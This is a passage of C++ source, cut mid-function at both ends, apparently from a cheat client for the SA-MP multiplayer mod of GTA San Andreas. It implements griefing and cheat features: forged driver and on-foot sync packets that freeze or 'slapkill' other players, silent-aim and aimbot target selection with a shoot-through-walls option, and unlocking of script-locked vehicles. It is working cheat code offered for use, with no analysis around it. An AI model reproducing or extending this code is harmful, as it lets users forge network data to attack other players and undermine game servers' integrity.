	struct actor_info *self = actor_info_get(ACTOR_SELF, 0);

	if (!g_SAMP || set.noBigHacks)
		return;

	if(set.iTroll_Targetname != "NaN" && !ValidPlayer(set.iTroll_Target)) set.iTroll_Targetname = "NaN";

	/*if (cheat_state->state != CHEAT_STATE_VEHICLE)
	{
		set.iTroll = 0;
		set.iTroll_Target = 0xFFFF;
		return;
	}*/

	int iClosestVehicleGTAID = vehicle_find_nearest(VEHICLE_ALIVE + VEHICLE_OCCUPIED);
	struct vehicle_info *pClosestVehicle = vehicle_info_get(iClosestVehicleGTAID, 0);
	unsigned short usClosestVehicleSAMPID = getSAMPVehicleIDFromGTAVehicle(pClosestVehicle);

	if (pClosestVehicle != NULL && ValidVehicle(usClosestVehicleSAMPID))
	{
		struct actor_info *target = g_Vehicles->pGTA_Vehicle[usClosestVehicleSAMPID]->passengers[0];

		if (target != NULL && target != self)
		{
			int iTargetPlayerID = getSAMPPlayerIDFromGTAPed(target);

			if (ValidPlayer(iTargetPlayerID))
			{
				set.iTroll_Target = iTargetPlayerID;
				set.iTroll_Targetname = g_Players->pRemotePlayer[iTargetPlayerID]->strPlayerName;
				return;
			}
		}
	}

	set.iTroll_Target = 0xFFFF;
}

void cheat_handle_freezetroll()
{
#if defined DEBUG_BAR_POS
	int pos[2], size[2];
	TwGetParam(TwGetBarByName("MainMenu"), NULL, "position", TW_PARAM_INT32, 2, pos);
	TwGetParam(TwGetBarByName("MainMenu"), NULL, "size", TW_PARAM_INT32, 2, size);
	char strn[256] = { 0 };
	
	sprintf(strn, "size = '%d %d' position = '%d %d'", size[0], size[1], pos[0], pos[1]);
	set.mmdef = strn;

	TwGetParam(TwGetBarByName("wepFuncs"), NULL, "position", TW_PARAM_INT32, 2, pos);
	TwGetParam(TwGetBarByName("wepFuncs"), NULL, "size", TW_PARAM_INT32, 2, size);
	sprintf(strn, "size = '%d %d' position = '%d %d'", size[0], size[1], pos[0], pos[1]);
	set.wbdef = strn;

	TwGetParam(TwGetBarByName("vehFuncs"), NULL, "position", TW_PARAM_INT32, 2, pos);
	TwGetParam(TwGetBarByName("vehFuncs"), NULL, "size", TW_PARAM_INT32, 2, size);
	sprintf(strn, "size = '%d %d' position = '%d %d'", size[0], size[1], pos[0], pos[1]);
	set.vbdef = strn;

	TwGetParam(TwGetBarByName("miscFuncs"), NULL, "position", TW_PARAM_INT32, 2, pos);
	TwGetParam(TwGetBarByName("miscFuncs"), NULL, "size", TW_PARAM_INT32, 2, size);
	sprintf(strn, "size = '%d %d' position = '%d %d'", size[0], size[1], pos[0], pos[1]);
	set.mbdef = strn;
#endif

	struct actor_info *self = actor_info_get(ACTOR_SELF, 0);

	if (!g_SAMP)
		return;

	if (set.freeze == 0 || set.noBigHacks) return;

	if (cheat_state->state != CHEAT_STATE_VEHICLE)
	{
		set.freeze = 0;
		set.freeze_target = 0xFFFF;
		addMessageToChatWindow("Stopped freezing, you are not inside a vehicle.");
		return;
	}
	if (!ValidPlayer(set.freeze_target) || !IsPlayerStreamed(set.freeze_target))
	{
		set.freeze = 0;
		set.freeze_target = 0xFFFF;
		addMessageToChatWindow("Stopped freezing, target has left/streamed out.");
		return;
	}
	if (getPlayerState(set.freeze_target) != PLAYER_STATE_DRIVER)
	{
		set.freeze = 0;
		set.freeze_target = 0xFFFF;
		addMessageToChatWindow("Stopped freezing, target is not driving.");
		return;
	}
	if (!ValidVehicle(g_Players->pRemotePlayer[set.freeze_target]->pPlayerData->inCarData.sVehicleID))
	{
		set.freeze = 0;
		set.freeze_target = 0xFFFF;
		addMessageToChatWindow("Stopped freezing, target is not in a valid vehicle.");
		return;
	}

	int iTargetPlayerID = set.freeze_target;
	uint16_t sTargetVehicleID = g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.sVehicleID;
	if (ValidVehicle(sTargetVehicleID))
	{
		float moveSpeedZero[3];
		moveSpeedZero[0] = 0.0;
		moveSpeedZero[1] = 0.0;
		moveSpeedZero[2] = 0.0;
		SendFakeDriverSyncData(sTargetVehicleID, set.freeze_pos, g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fVehicleHealth, moveSpeedZero, g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fQuaternion);
		cheat_state_text("Freezing...");
	}
	return;
}

void cheat_handle_slapperesp()
{
	if (!g_SAMP) return;

	if (set.noBigHacks) return;

	if (!set.slapkill && !set.nearslapper) return;

	if (GetTickCount() - slapperLastUpdate > 1000) return; // if more than one second have passed to last slap

	CVector cPos;
	pPedSelf->GetBonePosition(BONE_SPINE1, &cPos);

	float fHeadPos[3] = { D3DXVECTOR3(CVecToD3DXVEC(cPos)).x, D3DXVECTOR3(CVecToD3DXVEC(cPos)).y, D3DXVECTOR3(CVecToD3DXVEC(cPos)).z };

	D3DXVECTOR3 poss, screenposs;
	CVector2D screenHeadPosition, screenLagAreaPosition;
	poss.x = fHeadPos[0];
	poss.y = fHeadPos[1];
	poss.z = fHeadPos[2];
	CalcScreenCoors(&poss, &screenposs);

	screenHeadPosition.fX = screenposs.x;
	screenHeadPosition.fY = screenposs.y;

	poss.x = slapperPos[0];
	poss.y = slapperPos[1];
	poss.z = slapperPos[2];
	CalcScreenCoors(&poss, &screenposs);

	screenLagAreaPosition.fX = screenposs.x;
	screenLagAreaPosition.fY = screenposs.y;

	if (screenposs.z > 1.f)
	{
		render->D3DLineOutlined(screenHeadPosition.fX,
			screenHeadPosition.fY,
			screenLagAreaPosition.fX,
			screenLagAreaPosition.fY,
			2.0,
			D3DCOLOR_XRGB(192, 0, 0), D3DCOLOR_XRGB(0, 0, 0));

		render->CircleOutlined(screenLagAreaPosition.fX - 2,
			screenLagAreaPosition.fY - 2, 10, 56, 2.0, D3DCOLOR_XRGB(192, 0, 0), D3DCOLOR_XRGB(0, 0, 0));

		char sBuf[128] = { 0 };

		sprintf(sBuf, "Currently Slapping");

		pD3DFont->PrintShadow(screenHeadPosition.fX - (pD3DFont->DrawLength(sBuf) / 2),
			screenHeadPosition.fY - 5,
			D3DCOLOR_RGBA(255, 255, 255, 224), sBuf);
	}
	return;
}


void cheat_handle_slapkill(BitStream *parameters)
{
	if (!g_SAMP)
		return;

	if (set.slapkill == 0 || set.noBigHacks) return;

	if (!ValidPlayer(set.slapkill_target) || !IsPlayerStreamed(set.slapkill_target))
	{
		set.slapkill = 0;
		set.slapkill_target = 0xFFFF;
		addMessageToChatWindow("Stopped slapkilling, target has left/streamed out.");
		return;
	}

	if (g_Players->pRemotePlayer[set.slapkill_target]->pPlayerData->pSAMP_Actor->pGTAEntity->hitpoints <= 0.7)
	{
		set.slapkill = 0;
		set.slapkill_target = 0xFFFF;
		addMessageToChatWindow("Stopped slapkilling, target has died.");
		return;
	}

	float fPos[3];
	getPlayerPos(set.slapkill_target, fPos);

	slapperLastUpdate = GetTickCount();
	vect3_copy(fPos, slapperPos);

	stOnFootData data;
	memset(&data, 0, sizeof(stOnFootData));

	data.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->armor;
	data.byteCurrentWeapon = 0;
	data.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->hitpoints;
	
	WORD wHitAngle = 0;
	static DWORD wHitAngleDelay = 0;

	if (set.byteSlapperState == 0)
		wHitAngle = 0;

	else if (set.byteSlapperState == 1)
		wHitAngle = 90;

	else if (set.byteSlapperState == 2)
		wHitAngle = 180;

	else if (set.byteSlapperState == 3)
		wHitAngle = 270;

	if (GetTickCount() - wHitAngleDelay > 250)
	{
		if (set.byteSlapperState < 3)
			set.byteSlapperState++;
		else
			set.byteSlapperState = 0;

		wHitAngleDelay = GetTickCount();
	}

	vect3_copy(fPos, data.fPosition);

	float fHitAngleInRadian = wHitAngle * 0.0174532925;

	if (getPlayerState(set.slapkill_target) == PLAYER_STATE_DRIVER || getPlayerState(set.slapkill_target) == PLAYER_STATE_PASSENGER)
	{
		data.sCurrentAnimationID = 301;

		data.fPosition[0] += sinf(-fHitAngleInRadian) * 15;
		data.fPosition[1] += sinf(-fHitAngleInRadian) * 15;
	}
	else
	{
		data.sCurrentAnimationID = random(0, 1000);

		data.fQuaternion[0] = random_float(0, 2);
		data.fQuaternion[1] = random_float(0, 2);
		data.fQuaternion[2] = random_float(0, 2);
		data.fQuaternion[3] = random_float(0, 2);

		data.fPosition[0] += sinf(-fHitAngleInRadian) * 5;
		data.fPosition[1] += sinf(-fHitAngleInRadian) * 5;
	}

	data.fMoveSpeed[0] = sinf(fHitAngleInRadian) * 20;
	data.fMoveSpeed[1] = cosf(fHitAngleInRadian) * 20;

	parameters->ResetWritePointer();

	parameters->Write((BYTE)ID_PLAYER_SYNC);
	parameters->Write((PCHAR)& data, sizeof(stOnFootData));

	return;
}

void GetAimingCenter(float &x, float &y)
{
	if (g_Players->pLocalPlayer != nullptr && g_Players->pLocalPlayer->byteCurrentWeapon != 34)
	{
		x = (float)pPresentParam.BackBufferWidth * 0.5299999714f;
		y = (float)pPresentParam.BackBufferHeight * 0.4f;
	}
	else
	{
		x = (float)pPresentParam.BackBufferWidth / 2.f;
		y = (float)pPresentParam.BackBufferHeight / 2.f;
	}
	return;
}

bool isInsideCircle(int circle_x, int circle_y,
	int rad, int x, int y)
{
	if ((x - circle_x) * (x - circle_x) +
		(y - circle_y) * (y - circle_y) <= rad * rad)
		return true;
	else
		return false;
}

int GetSilentAimTarget()
{
	traceLastFunc("GetSilentAimTarget");

	if (g_dwSAMP_Addr == NULL || g_SAMP == NULL)
		return -1;

	if (!pGameInterface)
		return -1;

	if (isBadPtr_GTA_pPed(pPedSelf))
		return -1;

	if (!g_Players || !g_Players->pLocalPlayer)
		return -1;

	int			iGTAID, selfGTAID;
	CVector		iterPosition, ourPosMinusIter, ourPosition;
	D3DXVECTOR3 poss, screenposs;
	float		centerX, centerY;
	int			targetID = -1;

	GetAimingCenter(centerX, centerY);


	if (pPedSelf->GetVehicle())
	{
		ourPosition = *(pPedSelf->GetVehicle()->GetPosition());
	}
	else
	{
		ourPosition = pPedSelfSA->Placeable.matrix->vPos;
	}

	selfGTAID = (int)pPedSelf->GetArrayID();

	CPedSA* iterPed = NULL;
	CPoolsSA* pPools = reinterpret_cast <CPoolsSA*> (pGameInterface->GetPools());
	CPoolsSA::pedPool_t::mapType::iterator iter = pPools->m_pedPool.map.begin();
	int iSAMPID;
	CVector2D screenPosition;
	CVector src;
	CCamera* pCamera = pGame->GetCamera();

	CCamSAInterface* pCam = (CCamSAInterface*)((CCamSA*)pCamera->GetCam(pCamera->GetActiveCam()))->GetInterface();
	CVector campos = pCam->Source;

	D3DXVECTOR3 vTempScr, vWorld;
	vTempScr.x = centerX;
	vTempScr.y = centerY;
	vTempScr.z = 700.0f;

	CalcWorldCoors(&vTempScr, &vWorld);

	set.silentaim_lastAimDist = 0.0;

	while (iter.pos < iter.end)
	{
		iterPed = iter.pos->second;

		iter.pos++;
		if (!iterPed)
			continue;

		iGTAID = (int)iterPed->GetArrayID();

		if (iGTAID == selfGTAID)
			continue;

	
		//iterPosition = iterPed->GetInterface()->Placeable.matrix->vPos;
		iterPosition = *iterPed->GetPosition();
		

		ourPosMinusIter = ourPosition - iterPosition;

		iSAMPID = translateGTASAMP_pedPool.iSAMPID[getPedGTAIDFromInterface((DWORD*)iterPed->GetPedInterface())];

		if ((g_Players->pRemotePlayer[iSAMPID] != NULL
			&& g_Players->pRemotePlayer[iSAMPID]->pPlayerData != NULL
			&& g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor != NULL
			&& (DWORD)g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor->pGTA_Ped == (DWORD)iterPed->GetPedInterface()) == false)
		{
			continue; // SAMP RUNNING BUT TARGET WAS NOT A SA-MP PLAYER, MIGHT BE ACTOR OR NPC
		}

		struct actor_info* targetact = getGTAPedFromSAMPPlayerID(iSAMPID);

		if (targetact == NULL)
			continue;

		float fPos[3];
		getPlayerPos(iSAMPID, fPos);

		poss.x = fPos[0];
		poss.y = fPos[1];
		poss.z = fPos[2];
		CalcScreenCoors(&poss, &screenposs);

		screenPosition.fX = screenposs.x;
		screenPosition.fY = screenposs.y;

		if (!isInsideCircle(centerX, centerY, set.silentaim_fov + 8, screenPosition.fX, screenPosition.fY))
			continue;

		double distance = sqrt(((centerX - screenPosition.fX) * (centerX - screenPosition.fX)) +
			((centerY - screenPosition.fY) * (centerY - screenPosition.fY)));

		iterPed->GetBonePosition(BONE_HEAD, &src);

		if (screenposs.z < 1.f)
			continue;

		if (distance > set.silentaim_lastAimDist && set.silentaim_lastAimDist != 0.0)
			continue;

		// FILTERS

		if (!set.silentaim_outOfRangeFilter && ourPosMinusIter.Length() > fWeaponRange[g_Players->pLocalPlayer->byteCurrentWeapon])
		{
			continue;
		}

		bool IsPlayerAfk = g_Players->pRemotePlayer[iSAMPID]->pPlayerData->iAFKState == 2;

		bool IsPlayerVisible = pGame->GetWorld()->IsLineOfSightClear(&campos, &src, true, false, false, true, true, false, false);

		bool IsPlayerAlive = true;

		if (g_Players->pRemotePlayer[iSAMPID]->pPlayerData->fActorHealth < 0.9f) IsPlayerAlive = false;

		if (iterPed->IsPlayingAnimation("SWEET_INJUREDLOOP")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("CS_DEAD_GUY")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("KO_SKID_FRONT")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("KO_SKID_BACK")) IsPlayerAlive = false;

		if (set.silentaim_teamFilter && g_Players->pLocalPlayer->byteTeamID2 != 255)
		{
			if (g_Players->pRemotePlayer[iSAMPID]->pPlayerData->byteTeamID == g_Players->pLocalPlayer->byteTeamID2)
				continue;
		}

		if (set.silentaim_colorFilter && samp_color_get(iSAMPID) == samp_color_get(g_Players->sLocalPlayerID))
			continue;

		if (set.silentaim_skinFilter &&
			g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.model_alt_id == g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.model_alt_id)
			continue;

		if (!set.silentaim_shotWall && !IsPlayerVisible)
			continue;

		if (set.silentaim_afkFilter && IsPlayerAfk)
			continue;

		if (set.silentaim_aliveFilter && !IsPlayerAlive)
			continue;

		if (set.silentaim_friendFilter && Friends.size() > 0 && FriendsListLoaded)
		{
			if (std::find(Friends.begin(), Friends.end(), getPlayerName(iSAMPID)) != Friends.end()) continue;
		}

		// FILTERS END
		
		set.silentaim_lastAimDist = distance;
		targetID = iSAMPID;
	}
	return targetID;
}

int GetAimTarget(bool teamFilter, bool colorFilter, bool skinFilter, bool visibleFilter, 
	bool afkFilter, bool aliveFilter, bool friendFilter, float findRange, int fieldofview)
{
	traceLastFunc("GetAimTarget");

	if (g_dwSAMP_Addr == NULL || g_SAMP == NULL)
		return -1;

	if (!pGameInterface)
		return -1;

	if (isBadPtr_GTA_pPed(pPedSelf))
		return -1;

	if (!g_Players || !g_Players->pLocalPlayer)
		return -1;

	int			iGTAID, selfGTAID;
	CVector		iterPosition, ourPosMinusIter, ourPosition;
	D3DXVECTOR3 poss, screenposs;
	float		centerX, centerY;
	int			targetID = -1;

	GetAimingCenter(centerX, centerY);


	if (pPedSelf->GetVehicle())
	{
		ourPosition = *(pPedSelf->GetVehicle()->GetPosition());
	}
	else
	{
		ourPosition = pPedSelfSA->Placeable.matrix->vPos;
	}

	selfGTAID = (int)pPedSelf->GetArrayID();

	CPedSA* iterPed = NULL;
	CPoolsSA* pPools = reinterpret_cast <CPoolsSA*> (pGameInterface->GetPools());
	CPoolsSA::pedPool_t::mapType::iterator iter = pPools->m_pedPool.map.begin();
	int iSAMPID;
	CVector2D screenPosition;
	CVector src;
	CCamera* pCamera = pGame->GetCamera();

	CCamSAInterface* pCam = (CCamSAInterface*)((CCamSA*)pCamera->GetCam(pCamera->GetActiveCam()))->GetInterface();
	CVector campos = pCam->Source;

	D3DXVECTOR3 vTempScr, vWorld;
	vTempScr.x = centerX;
	vTempScr.y = centerY;
	vTempScr.z = 700.0f;

	CalcWorldCoors(&vTempScr, &vWorld);

	float lastAimDist = 0.0;
	while (iter.pos < iter.end)
	{
		iterPed = iter.pos->second;

		iter.pos++;
		if (!iterPed)
			continue;

		iGTAID = (int)iterPed->GetArrayID();

		if (iGTAID == selfGTAID)
			continue;

		iterPosition = *iterPed->GetPosition();


		ourPosMinusIter = ourPosition - iterPosition;

		iSAMPID = translateGTASAMP_pedPool.iSAMPID[getPedGTAIDFromInterface((DWORD*)iterPed->GetPedInterface())];

		if ((g_Players->pRemotePlayer[iSAMPID] != NULL
			&& g_Players->pRemotePlayer[iSAMPID]->pPlayerData != NULL
			&& g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor != NULL
			&& (DWORD)g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor->pGTA_Ped == (DWORD)iterPed->GetPedInterface()) == false)
		{
			continue; // SAMP RUNNING BUT TARGET WAS NOT A SA-MP PLAYER, MIGHT BE ACTOR OR NPC
		}

		struct actor_info* targetact = getGTAPedFromSAMPPlayerID(iSAMPID);

		if (targetact == NULL)
			continue;

		float fPos[3];
		getPlayerPos(iSAMPID, fPos);

		poss.x = fPos[0];
		poss.y = fPos[1];
		poss.z = fPos[2];
		CalcScreenCoors(&poss, &screenposs);

		screenPosition.fX = screenposs.x;
		screenPosition.fY = screenposs.y;

		if (!isInsideCircle(centerX, centerY, fieldofview, screenPosition.fX, screenPosition.fY))
			continue;

		double distance = sqrt(((centerX - screenPosition.fX) * (centerX - screenPosition.fX)) +
			((centerY - screenPosition.fY) * (centerY - screenPosition.fY)));

		iterPed->GetBonePosition(BONE_HEAD, &src);

		if (screenposs.z < 1.f)
			continue;

		if (distance > lastAimDist && lastAimDist != 0.0)
			continue;

		// FILTERS

		if (ourPosMinusIter.Length() > findRange)
		{
			continue;
		}

		bool IsPlayerAfk = g_Players->pRemotePlayer[iSAMPID]->pPlayerData->iAFKState == 2;

		bool IsPlayerVisible = pGame->GetWorld()->IsLineOfSightClear(&campos, &src, true, false, false, true, true, false, false);

		bool IsPlayerAlive = true;

		if (g_Players->pRemotePlayer[iSAMPID]->pPlayerData->fActorHealth < 0.9f) IsPlayerAlive = false;

		if (iterPed->IsPlayingAnimation("SWEET_INJUREDLOOP")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("CS_DEAD_GUY")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("KO_SKID_FRONT")) IsPlayerAlive = false;
		if (iterPed->IsPlayingAnimation("KO_SKID_BACK")) IsPlayerAlive = false;

		if (teamFilter && g_Players->pLocalPlayer->byteTeamID2 != 255)
		{
			if (g_Players->pRemotePlayer[iSAMPID]->pPlayerData->byteTeamID == g_Players->pLocalPlayer->byteTeamID2)
				continue;
		}

		if (colorFilter && samp_color_get(iSAMPID) == samp_color_get(g_Players->sLocalPlayerID))
			continue;

		if (skinFilter &&
			g_Players->pRemotePlayer[iSAMPID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.model_alt_id == g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.model_alt_id)
			continue;

		if (visibleFilter && !IsPlayerVisible)
			continue;

		if (afkFilter && IsPlayerAfk)
			continue;

		if (aliveFilter && !IsPlayerAlive)
			continue;

		if (friendFilter && Friends.size() > 0 && FriendsListLoaded)
		{
			if (std::find(Friends.begin(), Friends.end(), getPlayerName(iSAMPID)) != Friends.end()) continue;
		}

		// FILTERS END

		lastAimDist = distance;
		targetID = iSAMPID;
	}
	return targetID;
}

bool IsPlayerStreamed(uint16_t playerID)
{
	if (g_Players == NULL)
		return false;
	if (g_Players->iIsListed[playerID] != 1)
		return false;
	if (g_Players->pRemotePlayer[playerID] == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
		return false;
	return true;
}

bool IsVehicleStreamed(uint16_t vehicleID)
{
	//if (g_Players->pLocalPlayer->sCurrentVehicleID == OLCheats->iVehicleID) { continue; }
	if (g_Vehicles->iIsListed[vehicleID] != 1)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID] == NULL)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle == NULL)
		return false;
	return true;
}

void GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(float fX, float fY, float fZ)
{
	struct actor_info *myinfo = actor_info_get(ACTOR_SELF, 0);
	if (myinfo)
	{
		DWORD dwFunc = 0x59C790;

		float fRotPtr[3];
		float *fpActorMatrix = myinfo->base.matrix;
		float *fpActorSpin = &myinfo->spin[0];
		float fFuncRet[3];

		fX *= 0.02000000f;
		fY *= 0.02000000f;
		fZ *= 0.02000000f;
		fRotPtr[0] = fX;
		fRotPtr[1] = fY;
		fRotPtr[2] = fZ;

		_asm
		{
			lea ecx, fRotPtr
			push ecx
			push fpActorMatrix
			lea edx, fFuncRet
			push edx
			call dwFunc
		}

		fpActorSpin[0] += fFuncRet[0];
		fpActorSpin[1] += fFuncRet[1];
		fpActorSpin[2] += fFuncRet[2];

		vect3_copy(fpActorSpin, fFuncRet);
	}
}

void cheat_handle_playerbreakdance()
{

	traceLastFunc("cheat_handle_playerbreakdance()");

	static float    velpos, velneg;


	if (set.actBrkDance)
	{

		float    fTimeStep = *(float *)0xB7CB5C;
		float	 brkdance_velocity = 2.0;

		velpos = brkdance_velocity * fTimeStep;
		velneg = -brkdance_velocity * fTimeStep;

		if (KEY_DOWN(KEY_I))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(velneg, 0.0f, 0.0f);
		}
		else if (KEY_DOWN(KEY_K))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(velpos, 0.0f, 0.0f);
		}
		else if (KEY_DOWN(KEY_L))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(0.0f, velpos, 0.0f);
		}
		else if (KEY_DOWN(KEY_J))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(0.0f, velneg, 0.0f);
		}
		else if (KEY_DOWN(KEY_O))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(0.0f, 0.0f, velneg);
		}
		else if (KEY_DOWN(KEY_U))
		{
			GTAfunc_Player_ApplyRotoryPulseAboutAnAxis(0.0f, 0.0f, velpos);
		}
	}
}

std::string extractfromstr(const std::string& s,
	const std::string& start_delim,
	const std::string& stop_delim)
{
	unsigned first_delim_pos = s.find(start_delim);
	unsigned end_pos_of_first_delim = first_delim_pos + start_delim.length();
	unsigned last_delim_pos = s.find(stop_delim);

	return s.substr(end_pos_of_first_delim,
		last_delim_pos - end_pos_of_first_delim);
}

std::string extractfromstr(const char* scc,
	const char* start_delim,
	const char* stop_delim)
{
	std::string s = scc;

	unsigned first_delim_pos = s.find(start_delim);
	unsigned end_pos_of_first_delim = first_delim_pos + strlen(start_delim);
	unsigned last_delim_pos = s.find(stop_delim);

	return s.substr(end_pos_of_first_delim,
		last_delim_pos - end_pos_of_first_delim);
}

void clickUnlock()
{
	traceLastFunc("clickUnlock()");

	if (!g_iCursorEnabled) return;
	if (!set.vunlocker) return;
	if (gta_menu_active()) return;

	POINT cursor_pos;
	if (GetCursorPos(&cursor_pos) && ScreenToClient(pPresentParam.hDeviceWindow, &cursor_pos))
	{
		D3DXVECTOR3 poss, screenposs;
		char buf[256];

		CVehicle* pCVehicleTeleport = nullptr;

		screenposs.x = (float)cursor_pos.x;
		screenposs.y = (float)cursor_pos.y;
		screenposs.z = 700.0f;

		CalcWorldCoors(&screenposs, &poss);

		CVector vecTarget(poss.x, poss.y, poss.z);

		// setup variables
		CVector				vecOrigin, vecGroundPos;
		CColPoint* pCollision = nullptr;
		CEntitySAInterface* pCollisionEntity = nullptr;

		// origin = our camera
		vecOrigin = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();

		// check for collision
		bool bCollision = GTAfunc_ProcessLineOfSight(&vecOrigin, &vecTarget, &pCollision, &pCollisionEntity,
			1, 1, 0, 1, 1, 0, 0, 0);

		if (bCollision && pCollision)
		{
			// calculate position to check for ground
			vecGroundPos = *pCollision->GetPosition();
			if (cheat_state->state == CHEAT_STATE_VEHICLE)
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 2.0f);
			}
			else
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 0.5f);
			}

			// get ground position from collision position
			if (pPedSelf->GetAreaCode() == 0)
			{
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZForPosition(vecGroundPos.fX, vecGroundPos.fY);
			}
			else
			{
				CVector vecGroundPosSlightlyAbove = vecGroundPos;
				vecGroundPosSlightlyAbove.fZ += 1.0f;
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZFor3DPosition(&vecGroundPosSlightlyAbove);
			}

			// setup some stuff for vehicle jumper
			if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_VEHICLE)
			{
				pCVehicleTeleport = pGameInterface->GetPools()->GetVehicle((DWORD*)pCollisionEntity);
				if (pCVehicleTeleport)
				{
					const struct vehicle_entry* vehicleEntry = gta_vehicle_get_by_id(pCVehicleTeleport->GetModelIndex());
					if (vehicleEntry != nullptr)
					{
						sprintf(buf, "Unlock %s", vehicleEntry->name);
					}
				}
				else
				{
					sprintf(buf, "Hover over a car");
				}
			}
			// setup some stuff for normal warp
			else
			{
				sprintf(buf, "Hover over a car");
			}
		}
		else
		{
			set.vunlockerenter = 0; // force disable, prevents clicks
			set.vunlocker = 0;
			//toggleSAMPCursor(0);
			return;
		}
		if (pCollision != nullptr)
		{
			// destroy the collision object
			pCollision->Destroy();
		}
		if (set.vunlockerenter)
		{
			if (pCVehicleTeleport != nullptr)
			{
				int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pCVehicleTeleport->GetInterface());

				struct vehicle_info* pVehicle = vehicle_info_get(iVehicleID, 0);

				// check that the vehicle is legit
				if (!isBadPtr_GTA_pVehicle(pVehicle) && pVehicle != NULL)
				{
					pCVehicleTeleport->LockDoors(false);
					pCVehicleTeleport->SetScriptLocked(false);
					pCVehicleTeleport->SetDoorsUndamageable(false);
				}
			}
			set.vunlocker = 0;
			set.vunlockerenter = 0;
			toggleSAMPCursor(0);
			g_iCursorEnabled = 0;
		}


		if (pCVehicleTeleport != nullptr)
		{
			D3DXVECTOR3 vehPoss, vehScreenposs;
			vehPoss.x = pCVehicleTeleport->GetPosition()->fX;
			vehPoss.y = pCVehicleTeleport->GetPosition()->fY;
			vehPoss.z = pCVehicleTeleport->GetPosition()->fZ + -1.0f;
			CalcScreenCoors(&vehPoss, &vehScreenposs);
			// print vehicle warp target name below vehicle & vehicle esp
			pD3DFontChat->PrintShadow(vehScreenposs.x, vehScreenposs.y + 10.0f, -1, buf);
		}
		else if (bCollision && pCollision)
		{
			D3DXVECTOR3 groundPoss, groundScreenposs;
			groundPoss.x = vecGroundPos.fX;
			groundPoss.y = vecGroundPos.fY;
			groundPoss.z = vecGroundPos.fZ;
			CalcScreenCoors(&groundPoss, &groundScreenposs);
			// print warp distance
			pD3DFontChat->PrintShadow(
				groundScreenposs.x - (pD3DFontChat->DrawLength(buf) / 2.0f) + 3.5f,
				groundScreenposs.y - 20.0f,
				-1, buf);
		}
	}
}

void clickAttach()
{
	traceLastFunc("clickAttach()");

	if (!g_iCursorEnabled) return;
	if (!set.attachingtrailer) return;
	if (gta_menu_active()) return;

	POINT cursor_pos;
	if (GetCursorPos(&cursor_pos) && ScreenToClient(pPresentParam.hDeviceWindow, &cursor_pos))
	{
		D3DXVECTOR3 poss, screenposs;
		char buf[256];

		CVehicle* pCVehicleTeleport = nullptr;

		screenposs.x = (float)cursor_pos.x;
		screenposs.y = (float)cursor_pos.y;
		screenposs.z = 700.0f;

		CalcWorldCoors(&screenposs, &poss);

		CVector vecTarget(poss.x, poss.y, poss.z);

		// setup variables
		CVector				vecOrigin, vecGroundPos;
		CColPoint* pCollision = nullptr;
		CEntitySAInterface* pCollisionEntity = nullptr;

		// origin = our camera
		vecOrigin = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();

		// check for collision
		bool bCollision = GTAfunc_ProcessLineOfSight(&vecOrigin, &vecTarget, &pCollision, &pCollisionEntity,
			1, 1, 0, 1, 1, 0, 0, 0);

		if (bCollision && pCollision)
		{
			// calculate position to check for ground
			vecGroundPos = *pCollision->GetPosition();
			if (cheat_state->state == CHEAT_STATE_VEHICLE)
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 2.0f);
			}
			else
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 0.5f);
			}

			// get ground position from collision position
			if (pPedSelf->GetAreaCode() == 0)
			{
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZForPosition(vecGroundPos.fX, vecGroundPos.fY);
			}
			else
			{
				CVector vecGroundPosSlightlyAbove = vecGroundPos;
				vecGroundPosSlightlyAbove.fZ += 1.0f;
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZFor3DPosition(&vecGroundPosSlightlyAbove);
			}

			// setup some stuff for vehicle jumper
			if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_VEHICLE)
			{
				pCVehicleTeleport = pGameInterface->GetPools()->GetVehicle((DWORD*)pCollisionEntity);
				if (pCVehicleTeleport)
				{
					const struct vehicle_entry* vehicleEntry = gta_vehicle_get_by_id(pCVehicleTeleport->GetModelIndex());
					if (vehicleEntry != nullptr)
					{
